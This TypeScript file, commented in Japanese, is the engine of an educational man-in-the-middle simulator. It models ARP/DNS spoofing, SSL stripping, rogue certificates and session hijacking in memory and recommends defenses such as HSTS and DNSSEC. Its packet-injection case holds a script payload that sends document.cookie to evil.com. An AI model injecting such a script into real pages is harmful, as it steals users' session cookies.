/**
 * @module engine
 * MITM（中間者攻撃）シミュレーターのコアエンジン。
 *
 * ネットワークノードの生成、証明書の生成・検証、パケットの作成・改ざん、
 * ARP/DNSスプーフィング、TLS検証、各種MITM攻撃のシミュレーション、
 * 防御勧告の生成などの機能を提供する。
 */

import type {
  NetNode, Protocol, TlsVersion, Certificate, Packet,
  AttackMethod, ArpEntry, DnsRecord, Defense,
  AttackStep, AttackResult, SimOp, SimEvent, EventType,
  SimulationResult,
} from "./types.js";

// ─── デフォルトノード ───

/**
 * デフォルトのネットワークノード群を生成する。
 * クライアント、Webサーバー、攻撃者、ルーター、DNSサーバーの5ノードを返す。
 * @returns シミュレーション用のネットワークノード配列
 */
export function defaultNodes(): NetNode[] {
  return [
    { id: "client", name: "クライアント", role: "client", ip: "192.168.1.10", mac: "AA:BB:CC:DD:EE:01" },
    { id: "server", name: "Webサーバー", role: "server", ip: "203.0.113.50", mac: "AA:BB:CC:DD:EE:02" },
    { id: "attacker", name: "攻撃者", role: "attacker", ip: "192.168.1.66", mac: "AA:BB:CC:DD:EE:99" },
    { id: "router", name: "ルーター", role: "router", ip: "192.168.1.1", mac: "AA:BB:CC:DD:EE:FF" },
    { id: "dns", name: "DNSサーバー", role: "dns", ip: "8.8.8.8", mac: "AA:BB:CC:DD:EE:53" },
  ];
}

// ─── 証明書 ───

/**
 * 正規のサーバー証明書を生成する。
 * Let's Encrypt発行の信頼された証明書をシミュレートする。
 * @param domain - 証明書の対象ドメイン名
 * @returns 正規の証明書オブジェクト
 */
export function validCert(domain: string): Certificate {
  return {
    subject: domain,
    issuer: "Let's Encrypt Authority X3",
    validCa: true,
    domainMatch: true,
    notExpired: true,
    selfSigned: false,
    fingerprint: "SHA256:" + fakeSha256("valid-" + domain),
  };
}

/**
 * 攻撃者が生成した偽の自己署名証明書を作成する。
 * 信頼されたCAによる署名がなく、証明書検証で検出可能。
 * @param domain - 偽装対象のドメイン名
 * @returns 偽造された証明書オブジェクト
 */
export function forgedCert(domain: string): Certificate {
  return {
    subject: domain,
    issuer: "Evil CA",
    validCa: false,
    domainMatch: true,
    notExpired: true,
    selfSigned: true,
    fingerprint: "SHA256:" + fakeSha256("forged-" + domain),
  };
}

/**
 * 擬似SHA256ハッシュ値を生成する（シミュレーション用）。
 * 実際の暗号学的ハッシュではなく、表示用の64文字16進文字列を生成する。
 * @param input - ハッシュ対象の文字列
 * @returns 64文字の擬似ハッシュ値
 */
function fakeSha256(input: string): string {
  let hash = 0;
  for (let i = 0; i < input.length; i++) {
    hash = ((hash << 5) - hash + input.charCodeAt(i)) | 0;
  }
  const hex = Math.abs(hash).toString(16).padStart(8, "0");
  return (hex + hex + hex + hex + hex + hex + hex + hex).slice(0, 64);
}

// ─── パケット生成 ───

/** パケットIDの自動採番用カウンター */
let packetId = 0;

/**
 * ネットワークパケットを生成する。
 * 送信元・宛先のIP/MACアドレス、ペイロード、暗号化状態を指定してパケットを作成する。
 * @param protocol - 通信プロトコル
 * @param srcIp - 送信元IPアドレス
 * @param dstIp - 宛先IPアドレス
 * @param srcMac - 送信元MACアドレス
 * @param dstMac - 宛先MACアドレス
 * @param payload - ペイロードデータ
 * @param encrypted - 暗号化されているか
 * @param tls - TLSバージョン
 * @returns 生成されたパケット
 */
export function createPacket(
  protocol: Protocol, srcIp: string, dstIp: string,
  srcMac: string, dstMac: string, payload: string,
  encrypted: boolean, tls: TlsVersion,
): Packet {
  return {
    id: ++packetId,
    protocol, srcIp, dstIp, srcMac, dstMac,
    payload, encrypted, tls,
    tampered: false,
    timestamp: Date.now(),
  };
}

/**
 * パケットを改ざんする。
 * 元のペイロードを保存した上で、新しいペイロードに置き換えた改ざん済みパケットを返す。
 * @param pkt - 改ざん対象のパケット
 * @param newPayload - 改ざん後のペイロード
 * @returns 改ざんされた新しいパケット（元パケットは変更されない）
 */
export function tamperPacket(pkt: Packet, newPayload: string): Packet {
  return {
    ...pkt,
    originalPayload: pkt.payload,
    payload: newPayload,
    tampered: true,
  };
}

/**
 * ペイロードを暗号化する（シミュレーション用）。
 * Base64エンコード後に文字をシフトして擬似的な暗号文を生成する。
 * 実際の暗号化アルゴリズムではなく、表示上の暗号化を模倣する。
 * @param payload - 平文のペイロード
 * @returns 擬似暗号化されたペイロード文字列
 */
export function encryptPayload(payload: string): string {
  // Base64風の暗号文を生成
  return btoa(payload).replace(/./g, (c) => {
    const code = c.charCodeAt(0);
    return String.fromCharCode(((code + 13) % 94) + 33);
  });
}

/**
 * 傍受したパケットの復号を試みる。
 * 暗号化されていないパケットはそのまま平文を返す。
 * 暗号化されたパケットは攻撃者には復号できないため失敗する。
 * @param payload - 復号対象のペイロード
 * @param encrypted - 暗号化されているか
 * @returns 復号の成否と平文（失敗時は復号不可のメッセージ）
 */
export function tryDecrypt(payload: string, encrypted: boolean): { success: boolean; plaintext: string } {
  if (!encrypted) return { success: true, plaintext: payload };
  return { success: false, plaintext: "[暗号化データ - 復号不可]" };
}

// ─── ARP スプーフィング ───

/**
 * 正常な（未攻撃の）ARPテーブルを生成する。
 * 各ノードのIP-MAC対応が正しく設定されたテーブルを返す。
 * @param nodes - ネットワークノード一覧
 * @returns 正常なARPテーブルエントリの配列
 */
export function normalArpTable(nodes: NetNode[]): ArpEntry[] {
  return nodes.map(n => ({ ip: n.ip, mac: n.mac, spoofed: false }));
}

/**
 * ARPスプーフィング攻撃を実行する。
 * 攻撃者が偽のARP応答を送信し、ターゲットIPのMACアドレスを攻撃者のものに書き換える。
 * 静的ARPエントリが設定されている場合は攻撃がブロックされる。
 * @param arpTable - 現在のARPテーブル
 * @param targetIp - 偽装対象のIPアドレス
 * @param attackerMac - 攻撃者のMACアドレス
 * @param defense - 防御設定
 * @param steps - 攻撃ステップの記録先配列（副作用で追記される）
 * @param events - イベントログの記録先配列（副作用で追記される）
 * @returns 更新後のARPテーブルと攻撃の成否
 */
export function arpSpoof(
  arpTable: ArpEntry[], targetIp: string, attackerMac: string,
  defense: Defense, steps: AttackStep[], events: SimEvent[],
): { table: ArpEntry[]; success: boolean } {
  // 防御チェック: 静的ARPエントリ
  if (defense.staticArp) {
    steps.push({
      phase: "ARP防御", actor: "クライアント",
      message: "静的ARPエントリが設定されているため、ARPスプーフィングを拒否",
      success: false,
    });
    events.push({ type: "block", actor: "クライアント", message: "静的ARPエントリによりスプーフィングをブロック" });
    return { table: arpTable, success: false };
  }

  // ARPスプーフィング実行
  steps.push({
    phase: "ARPスプーフィング", actor: "攻撃者",
    message: `偽ARP応答を送信: ${targetIp} → ${attackerMac}`,
    detail: `ARP Reply: ${targetIp} is-at ${attackerMac}`,
    success: true,
  });
  events.push({ type: "arp", actor: "攻撃者", message: `偽ARP応答: ${targetIp} = ${attackerMac}` });

  const newTable = arpTable.map(entry =>
    entry.ip === targetIp ? { ...entry, mac: attackerMac, spoofed: true } : entry
  );

  steps.push({
    phase: "ARPテーブル更新", actor: "クライアント",
    message: `ARPテーブルが更新された: ${targetIp} → ${attackerMac}`,
    success: true,
  });

  return { table: newTable, success: true };
}

// ─── DNS スプーフィング ───

/**
 * 正常な（未攻撃の）DNSレコードを生成する。
 * シミュレーション用の既定ドメイン解決情報を返す。
 * @returns 正常なDNSレコードの配列
 */
export function normalDnsRecords(): DnsRecord[] {
  return [
    { domain: "example.com", ip: "203.0.113.50", spoofed: false },
    { domain: "bank.example.com", ip: "203.0.113.100", spoofed: false },
  ];
}

/**
 * DNSスプーフィング攻撃を実行する。
 * 攻撃者が偽のDNS応答を送信し、ドメインの解決先IPを攻撃者のものに書き換える。
 * DNSSECが有効な場合は偽応答が検出されて攻撃がブロックされる。
 * @param records - 現在のDNSレコード
 * @param targetDomain - 偽装対象のドメイン名
 * @param attackerIp - 攻撃者のIPアドレス（誘導先）
 * @param defense - 防御設定
 * @param steps - 攻撃ステップの記録先配列（副作用で追記される）
 * @param events - イベントログの記録先配列（副作用で追記される）
 * @returns 更新後のDNSレコードと攻撃の成否
 */
export function dnsSpoof(
  records: DnsRecord[], targetDomain: string, attackerIp: string,
  defense: Defense, steps: AttackStep[], events: SimEvent[],
): { records: DnsRecord[]; success: boolean } {
  // 防御チェック: DNSSEC
  if (defense.dnssec) {
    steps.push({
      phase: "DNS防御", actor: "DNSリゾルバ",
      message: "DNSSEC検証により偽レコードを検出・拒否",
      success: false,
    });
    events.push({ type: "block", actor: "DNSリゾルバ", message: "DNSSEC検証で偽応答をブロック" });
    return { records, success: false };
  }

  // DNSスプーフィング実行
  steps.push({
    phase: "DNSスプーフィング", actor: "攻撃者",
    message: `偽DNS応答を送信: ${targetDomain} → ${attackerIp}`,
    detail: `DNS Response: ${targetDomain} A ${attackerIp} (偽)`,
    success: true,
  });
  events.push({ type: "dns", actor: "攻撃者", message: `偽DNS応答: ${targetDomain} → ${attackerIp}` });

  const newRecords = records.map(r =>
    r.domain === targetDomain ? { ...r, ip: attackerIp, spoofed: true } : r
  );

  // レコードが存在しない場合は追加
  if (!records.some(r => r.domain === targetDomain)) {
    newRecords.push({ domain: targetDomain, ip: attackerIp, spoofed: true });
  }

  return { records: newRecords, success: true };
}

// ─── TLS / 証明書検証 ───

/**
 * TLS接続と証明書を検証する。
 * TLSバージョンの最小要件チェック、証明書の信頼性検証、
 * 証明書ピンニングによる偽証明書検出を行う。
 * @param tls - 使用するTLSバージョン
 * @param cert - サーバー証明書（TLS未使用時はundefined可）
 * @param defense - 防御設定
 * @param steps - 攻撃ステップの記録先配列（副作用で追記される）
 * @param events - イベントログの記録先配列（副作用で追記される）
 * @returns 検証の成否と失敗理由の一覧
 */
export function validateTls(
  tls: TlsVersion, cert: Certificate | undefined,
  defense: Defense, steps: AttackStep[], events: SimEvent[],
): { valid: boolean; reasons: string[] } {
  const reasons: string[] = [];

  if (tls === "none") {
    reasons.push("TLS未使用（平文通信）");
    steps.push({ phase: "TLS検証", actor: "クライアント", message: "TLSなし - 平文通信", success: true });
    return { valid: true, reasons };
  }

  // TLS最小バージョンチェック
  const tlsOrder: Record<TlsVersion, number> = { none: 0, "tls1.0": 1, "tls1.2": 2, "tls1.3": 3 };
  if (tlsOrder[tls] < tlsOrder[defense.minTls]) {
    reasons.push(`TLSバージョン ${tls} は最小要件 ${defense.minTls} を満たさない`);
    steps.push({
      phase: "TLS検証", actor: "クライアント",
      message: `TLSバージョン不足: ${tls} < ${defense.minTls}`,
      success: false,
    });
    events.push({ type: "tls", actor: "クライアント", message: `TLS ${tls} を拒否（最小: ${defense.minTls}）` });
    return { valid: false, reasons };
  }

  if (!cert) {
    reasons.push("証明書なし");
    return { valid: false, reasons };
  }

  // 証明書検証
  const certIssues: string[] = [];
  if (!cert.validCa) certIssues.push("信頼されたCAが発行していない");
  if (!cert.domainMatch) certIssues.push("ドメイン名が一致しない");
  if (!cert.notExpired) certIssues.push("証明書の有効期限切れ");
  if (cert.selfSigned) certIssues.push("自己署名証明書");

  if (certIssues.length > 0 && defense.strictCertValidation) {
    reasons.push(...certIssues);
    steps.push({
      phase: "証明書検証", actor: "クライアント",
      message: `証明書の問題を検出: ${certIssues.join(", ")}`,
      success: false,
    });
    events.push({ type: "cert", actor: "クライアント", message: `証明書拒否: ${certIssues.join(", ")}` });
    return { valid: false, reasons };
  }

  // 証明書ピンニング
  if (defense.certPinning && cert.selfSigned) {
    reasons.push("証明書ピンニングにより偽証明書を検出");
    steps.push({
      phase: "証明書ピンニング", actor: "クライアント",
      message: "ピン留めされたフィンガープリントと不一致",
      success: false,
    });
    events.push({ type: "cert", actor: "クライアント", message: "証明書ピンニングで偽証明書をブロック" });
    return { valid: false, reasons };
  }

  steps.push({
    phase: "TLS検証", actor: "クライアント",
    message: `TLS ${tls} 接続確立、証明書検証OK`,
    success: true,
  });
  events.push({ type: "tls", actor: "クライアント", message: `TLS ${tls} ハンドシェイク完了` });
  return { valid: true, reasons };
}

// ─── 攻撃シミュレーション ───

/**
 * 単一の攻撃シミュレーションを実行する。
 * 指定された攻撃手法に応じたフェーズ（ARP/DNSスプーフィング、パケット傍受、
 * 復号試行、改ざん、転送など）を順に実行し、結果を返す。
 * @param op - シミュレーション操作（攻撃手法、プロトコル、防御設定等）
 * @returns 攻撃結果（ステップ、パケット、成否、防御勧告等を含む）
 */
export function simulateAttack(op: SimOp): AttackResult {
  packetId = 0;
  const nodes = defaultNodes();
  let arpTable = normalArpTable(nodes);
  let dnsRecords = normalDnsRecords();
  const packets: Packet[] = [];
  const steps: AttackStep[] = [];
  const events: SimEvent[] = [];
  const blocked: string[] = [];
  const mitigations: string[] = [];

  const client = nodes.find(n => n.role === "client")!;
  const server = nodes.find(n => n.role === "server")!;
  const attacker = nodes.find(n => n.role === "attacker")!;

  let intercepted = false;
  let dataLeaked = false;
  let tampered = false;

  const encrypted = op.tls !== "none";
  const payload = encrypted ? encryptPayload(op.httpPayload) : op.httpPayload;

  events.push({
    type: "info", actor: "シミュレーション",
    message: `攻撃手法: ${attackMethodLabel(op.method)} | プロトコル: ${op.protocol.toUpperCase()} | TLS: ${op.tls}`,
  });

  switch (op.method) {
    case "arp_spoofing": {
      // フェーズ1: ARPスプーフィング
      const arpResult = arpSpoof(arpTable, server.ip, attacker.mac, op.defense, steps, events);
      arpTable = arpResult.table;

      if (arpResult.success) {
        // フェーズ2: パケット傍受
        const pkt = createPacket(op.protocol, client.ip, server.ip, client.mac, attacker.mac, payload, encrypted, op.tls);
        packets.push(pkt);

        steps.push({
          phase: "パケット傍受", actor: "攻撃者",
          message: "ARPスプーフィングによりパケットが攻撃者を経由",
          packet: pkt, success: true,
        });
        events.push({ type: "intercept", actor: "攻撃者", message: "パケットを傍受" });
        intercepted = true;

        // フェーズ3: 復号試行
        const decResult = tryDecrypt(pkt.payload, pkt.encrypted);
        if (decResult.success) {
          dataLeaked = true;
          steps.push({
            phase: "データ読取", actor: "攻撃者",
            message: `平文データを読取: "${decResult.plaintext}"`,
            success: true,
          });
          events.push({ type: "decrypt", actor: "攻撃者", message: "平文データを取得" });

          // 改ざん
          const tamperedPkt = tamperPacket(pkt, op.httpPayload.replace(/password=\w+/, "password=hacked"));
          packets.push(tamperedPkt);
          tampered = true;
          steps.push({
            phase: "パケット改ざん", actor: "攻撃者",
            message: "パケット内容を改ざんして転送",
            packet: tamperedPkt, success: true,
          });
          events.push({ type: "tamper", actor: "攻撃者", message: "パケットを改ざん" });
        } else {
          steps.push({
            phase: "データ読取", actor: "攻撃者",
            message: "暗号化されており内容を読取不可",
            success: false,
          });
          events.push({ type: "decrypt", actor: "攻撃者", message: "暗号化により読取失敗" });
        }

        // フェーズ4: 転送
        const fwdPkt = createPacket(op.protocol, client.ip, server.ip, attacker.mac, server.mac, tampered ? packets[packets.length - 1].payload : payload, encrypted, op.tls);
        packets.push(fwdPkt);
        steps.push({
          phase: "パケット転送", actor: "攻撃者",
          message: "パケットをサーバーへ転送",
          packet: fwdPkt, success: true,
        });
        events.push({ type: "forward", actor: "攻撃者", message: "パケットをサーバーへ転送" });
      } else {
        blocked.push("静的ARPエントリにより攻撃をブロック");
      }
      break;
    }

    case "dns_spoofing": {
      // フェーズ1: DNSスプーフィング
      const dnsResult = dnsSpoof(dnsRecords, "example.com", attacker.ip, op.defense, steps, events);
      dnsRecords = dnsResult.records;

      if (dnsResult.success) {
        // フェーズ2: クライアントが攻撃者のサーバーに接続
        steps.push({
          phase: "DNS解決", actor: "クライアント",
          message: `example.com → ${attacker.ip} (攻撃者のサーバー)`,
          success: true,
        });
        events.push({ type: "dns", actor: "クライアント", message: `example.com を ${attacker.ip} に解決（偽）` });

        // フェーズ3: TLS検証
        if (op.tls !== "none" && op.serverCert) {
          const tlsResult = validateTls(op.tls, forgedCert("example.com"), op.defense, steps, events);
          if (!tlsResult.valid) {
            blocked.push(...tlsResult.reasons);
            steps.push({
              phase: "接続中断", actor: "クライアント",
              message: "TLS/証明書の問題により接続を中断",
              success: false,
            });
            break;
          }
        }

        // フェーズ4: データ送信（攻撃者のサーバーへ）
        const pkt = createPacket(op.protocol, client.ip, attacker.ip, client.mac, attacker.mac, payload, encrypted, op.tls);
        packets.push(pkt);
        intercepted = true;

        const decResult = tryDecrypt(pkt.payload, pkt.encrypted);
        if (decResult.success) {
          dataLeaked = true;
          steps.push({
            phase: "データ窃取", actor: "攻撃者",
            message: `クライアントのデータを受信: "${decResult.plaintext}"`,
            success: true,
          });
          events.push({ type: "intercept", actor: "攻撃者", message: "クライアントデータを窃取" });
        } else {
          // DNSスプーフィング + TLS: 攻撃者は自分のサーバーなので復号可能
          dataLeaked = true;
          steps.push({
            phase: "データ窃取", actor: "攻撃者",
            message: `自サーバーでTLS終端、データ復号: "${op.httpPayload}"`,
            success: true,
          });
          events.push({ type: "decrypt", actor: "攻撃者", message: "自サーバーでTLS終端・復号" });
        }
      } else {
        blocked.push("DNSSECにより攻撃をブロック");
      }
      break;
    }

    case "ssl_stripping": {
      // フェーズ1: ARPスプーフィングで中間者位置を確保
      const arpResult = arpSpoof(arpTable, server.ip, attacker.mac, op.defense, steps, events);
      arpTable = arpResult.table;

      if (!arpResult.success) {
        blocked.push("静的ARPエントリにより中間者位置の確保に失敗");
        break;
      }

      // フェーズ2: HSTS チェック
      if (op.defense.hsts) {
        steps.push({
          phase: "HSTS防御", actor: "クライアント",
          message: "HSTSヘッダにより HTTPS が強制される",
          success: false,
        });
        events.push({ type: "block", actor: "クライアント", message: "HSTSによりHTTPダウングレードをブロック" });
        blocked.push("HSTSによりSSLストリッピングをブロック");
        break;
      }

      // フェーズ3: SSLストリッピング実行
      steps.push({
        phase: "SSLストリッピング", actor: "攻撃者",
        message: "クライアント→攻撃者: HTTP (平文) / 攻撃者→サーバー: HTTPS",
        detail: "HTTPS→HTTPダウングレード: リダイレクトを書き換えてHTTPに誘導",
        success: true,
      });
      events.push({ type: "attack", actor: "攻撃者", message: "SSLストリッピング: HTTPS→HTTPダウングレード" });

      // クライアントは平文でデータを送信
      const plainPkt = createPacket("http", client.ip, attacker.ip, client.mac, attacker.mac, op.httpPayload, false, "none");
      packets.push(plainPkt);
      intercepted = true;
      dataLeaked = true;

      steps.push({
        phase: "平文傍受", actor: "攻撃者",
        message: `平文データを傍受: "${op.httpPayload}"`,
        packet: plainPkt, success: true,
      });
      events.push({ type: "intercept", actor: "攻撃者", message: "平文通信を傍受" });

      // 攻撃者はHTTPSでサーバーに転送
      const encPkt = createPacket("https", attacker.ip, server.ip, attacker.mac, server.mac, encryptPayload(op.httpPayload), true, "tls1.2");
      packets.push(encPkt);
      steps.push({
        phase: "HTTPS転送", actor: "攻撃者",
        message: "攻撃者がHTTPSでサーバーへ転送",
        packet: encPkt, success: true,
      });
      events.push({ type: "forward", actor: "攻撃者", message: "HTTPSでサーバーへ転送" });
      break;
    }

    case "rogue_cert": {
      // フェーズ1: 偽証明書を提示
      const fakeCert = forgedCert("example.com");
      steps.push({
        phase: "偽証明書提示", actor: "攻撃者",
        message: `偽証明書を提示: 発行者=${fakeCert.issuer}, 自己署名=${fakeCert.selfSigned}`,
        detail: `フィンガープリント: ${fakeCert.fingerprint}`,
        success: true,
      });
      events.push({ type: "cert", actor: "攻撃者", message: "偽証明書を提示" });

      // フェーズ2: 証明書検証
      const tlsResult = validateTls(op.tls, fakeCert, op.defense, steps, events);

      if (!tlsResult.valid) {
        blocked.push(...tlsResult.reasons);
        steps.push({
          phase: "接続拒否", actor: "クライアント",
          message: "証明書検証失敗により接続を拒否",
          success: false,
        });
        break;
      }

      // フェーズ3: 検証を通過 → データ傍受
      steps.push({
        phase: "TLS確立", actor: "攻撃者",
        message: "偽証明書が受け入れられ、TLS接続を確立",
        success: true,
      });
      events.push({ type: "tls", actor: "攻撃者", message: "偽証明書でTLS確立" });

      const pkt = createPacket(op.protocol, client.ip, attacker.ip, client.mac, attacker.mac, op.httpPayload, false, "none");
      packets.push(pkt);
      intercepted = true;
      dataLeaked = true;

      steps.push({
        phase: "データ傍受", actor: "攻撃者",
        message: `TLSを終端しデータを復号: "${op.httpPayload}"`,
        success: true,
      });
      events.push({ type: "decrypt", actor: "攻撃者", message: "偽証明書経由でデータを復号" });
      break;
    }

    case "session_hijack": {
      // フェーズ1: ARPスプーフィングで中間者位置を確保
      const arpResult2 = arpSpoof(arpTable, server.ip, attacker.mac, op.defense, steps, events);
      arpTable = arpResult2.table;

      if (!arpResult2.success) {
        blocked.push("静的ARPエントリにより中間者位置の確保に失敗");
        break;
      }

      // フェーズ2: セッション情報の傍受
      const sessionPayload = "Cookie: session_id=abc123def456; user=admin";
      const pkt = createPacket(op.protocol, client.ip, server.ip, client.mac, attacker.mac,
        encrypted ? encryptPayload(sessionPayload) : sessionPayload, encrypted, op.tls);
      packets.push(pkt);
      intercepted = true;

      const decResult = tryDecrypt(pkt.payload, pkt.encrypted);
      if (decResult.success) {
        dataLeaked = true;
        steps.push({
          phase: "セッション窃取", actor: "攻撃者",
          message: `セッションCookieを窃取: session_id=abc123def456`,
          detail: decResult.plaintext,
          success: true,
        });
        events.push({ type: "intercept", actor: "攻撃者", message: "セッションCookieを窃取" });

        // フェーズ3: セッションを使用
        const hijackPkt = createPacket(op.protocol, attacker.ip, server.ip, attacker.mac, server.mac,
          "Cookie: session_id=abc123def456; user=admin", false, op.tls);
        packets.push(hijackPkt);
        steps.push({
          phase: "セッションハイジャック", actor: "攻撃者",
          message: "窃取したセッションIDでサーバーにアクセス",
          packet: hijackPkt, success: true,
        });
        events.push({ type: "attack", actor: "攻撃者", message: "セッションハイジャック実行" });
      } else {
        steps.push({
          phase: "セッション窃取", actor: "攻撃者",
          message: "暗号化によりセッション情報を読取不可",
          success: false,
        });
        events.push({ type: "decrypt", actor: "攻撃者", message: "暗号化によりセッション窃取失敗" });
      }
      break;
    }

    case "packet_injection": {
      // フェーズ1: ARPスプーフィングで中間者位置を確保
      const arpResult3 = arpSpoof(arpTable, server.ip, attacker.mac, op.defense, steps, events);
      arpTable = arpResult3.table;

      if (!arpResult3.success) {
        blocked.push("静的ARPエントリにより中間者位置の確保に失敗");
        break;
      }

      intercepted = true;

      // フェーズ2: パケットインジェクション
      if (encrypted) {
        steps.push({
          phase: "インジェクション試行", actor: "攻撃者",
          message: "暗号化通信へのインジェクションは困難",
          success: false,
        });
        events.push({ type: "attack", actor: "攻撃者", message: "暗号化によりインジェクション困難" });
      } else {
        const injectedPayload = '<script>document.location="https://evil.com/steal?c="+document.cookie</script>';
        const injPkt = createPacket("http", server.ip, client.ip, attacker.mac, client.mac, injectedPayload, false, "none");
        packets.push(injPkt);
        tampered = true;

        steps.push({
          phase: "パケットインジェクション", actor: "攻撃者",
          message: "悪意のあるスクリプトをHTTPレスポンスに注入",
          detail: injectedPayload,
          packet: injPkt, success: true,
        });
        events.push({ type: "tamper", actor: "攻撃者", message: "レスポンスに悪意のあるスクリプトを注入" });
      }
      break;
    }

    case "passive_sniff": {
      // パッシブ盗聴（ARPスプーフィング不要、同一セグメント前提）
      steps.push({
        phase: "パッシブ盗聴", actor: "攻撃者",
        message: "ネットワーク上のパケットを受動的に監視",
        success: true,
      });
      events.push({ type: "intercept", actor: "攻撃者", message: "パッシブ盗聴を開始" });

      const pkt = createPacket(op.protocol, client.ip, server.ip, client.mac, server.mac, payload, encrypted, op.tls);
      packets.push(pkt);
      intercepted = true;

      const decResult = tryDecrypt(pkt.payload, pkt.encrypted);
      if (decResult.success) {
        dataLeaked = true;
        steps.push({
          phase: "データ読取", actor: "攻撃者",
          message: `平文データを読取: "${decResult.plaintext}"`,
          success: true,
        });
        events.push({ type: "decrypt", actor: "攻撃者", message: "平文データを取得" });
      } else {
        steps.push({
          phase: "データ読取", actor: "攻撃者",
          message: "暗号化されており内容を読取不可",
          success: false,
        });
        events.push({ type: "decrypt", actor: "攻撃者", message: "暗号化により読取失敗" });
      }
      break;
    }
  }

  // ─── 防御勧告の生成 ───
  generateMitigations(op, intercepted, dataLeaked, tampered, blocked, mitigations);

  return {
    method: op.method, nodes, arpTable, dnsRecords,
    packets, steps, intercepted, dataLeaked, tampered, blocked, mitigations,
  };
}

/**
 * 攻撃結果に基づいて防御勧告を生成する。
 * 攻撃が成功した場合、未有効の防御策を推奨メッセージとして追加する。
 * 全防御が機能していた場合は成功メッセージを返す。
 * @param op - 実行したシミュレーション操作
 * @param intercepted - パケットが傍受されたか
 * @param dataLeaked - データが漏洩したか
 * @param tampered - データが改ざんされたか
 * @param blocked - 防御によりブロックされた理由の配列
 * @param mitigations - 防御勧告の出力先配列（副作用で追記される）
 */
function generateMitigations(
  op: SimOp, intercepted: boolean, dataLeaked: boolean, tampered: boolean,
  blocked: string[], mitigations: string[],
): void {
  if (blocked.length > 0 && !dataLeaked && !tampered) {
    mitigations.push("✓ 防御が適切に機能しています");
    return;
  }

  if (op.tls === "none") {
    mitigations.push("HTTPS(TLS)を使用して通信を暗号化してください");
  } else if (op.tls === "tls1.0") {
    mitigations.push("TLS 1.0は脆弱です。TLS 1.2以上を使用してください");
  }

  if (!op.defense.hsts) {
    mitigations.push("HSTSを有効にしてHTTPSを強制してください");
  }
  if (!op.defense.certPinning) {
    mitigations.push("証明書ピンニングで偽証明書を検出してください");
  }
  if (!op.defense.dnssec) {
    mitigations.push("DNSSECでDNS応答の真正性を検証してください");
  }
  if (!op.defense.staticArp) {
    mitigations.push("静的ARPエントリまたはDynamic ARP Inspection(DAI)を使用してください");
  }
  if (!op.defense.strictCertValidation) {
    mitigations.push("証明書の厳格な検証を有効にしてください");
  }

  if (intercepted && dataLeaked) {
    mitigations.push("VPNの使用も検討してください");
  }
}

/**
 * 攻撃手法の日本語ラベルを取得する。
 * UI表示用に攻撃手法コードを人間が読める名前に変換する。
 * @param method - 攻撃手法コード
 * @returns 日本語の攻撃手法名
 */
export function attackMethodLabel(method: AttackMethod): string {
  const labels: Record<AttackMethod, string> = {
    arp_spoofing: "ARPスプーフィング",
    dns_spoofing: "DNSスプーフィング",
    ssl_stripping: "SSLストリッピング",
    rogue_cert: "偽証明書攻撃",
    session_hijack: "セッションハイジャック",
    packet_injection: "パケットインジェクション",
    passive_sniff: "パッシブ盗聴",
  };
  return labels[method];
}

// ─── 防御プリセット ───

/**
 * 防御なしの設定を生成する。
 * すべての防御メカニズムが無効な状態。攻撃が最も成功しやすい。
 * @returns 防御無効の設定オブジェクト
 */
export function noDefense(): Defense {
  return {
    hsts: false, certPinning: false, dnssec: false,
    staticArp: false, minTls: "none", strictCertValidation: false,
  };
}

/**
 * フル防御の設定を生成する。
 * HSTS、証明書ピンニング、DNSSEC、静的ARP、TLS1.2以上、厳格な証明書検証が
 * すべて有効な状態。多層防御のデモンストレーション用。
 * @returns 全防御有効の設定オブジェクト
 */
export function fullDefense(): Defense {
  return {
    hsts: true, certPinning: true, dnssec: true,
    staticArp: true, minTls: "tls1.2", strictCertValidation: true,
  };
}

/**
 * HSTSのみ有効な防御設定を生成する。
 * SSLストリッピング攻撃に対する防御効果の検証に使用する。
 * @returns HSTS有効の設定オブジェクト
 */
export function hstsOnly(): Defense {
  return { ...noDefense(), hsts: true };
}

/**
 * 証明書検証のみ有効な防御設定を生成する。
 * 厳格な証明書検証と証明書ピンニングを有効にし、偽証明書攻撃への防御効果を検証する。
 * @returns 証明書検証有効の設定オブジェクト
 */
export function certDefense(): Defense {
  return { ...noDefense(), strictCertValidation: true, certPinning: true };
}

// ─── シミュレーション ───

/** 複数攻撃を実行 */
export function simulate(ops: SimOp[]): SimulationResult {
  const results: AttackResult[] = [];
  const events: SimEvent[] = [];

  for (const op of ops) {
    const result = simulateAttack(op);
    results.push(result);
    events.push(...result.steps.map(s => ({
      type: "info" as EventType,
      actor: s.actor,
      message: `[${s.phase}] ${s.message}`,
      detail: s.detail,
    })));
  }

  return { results, events };
}
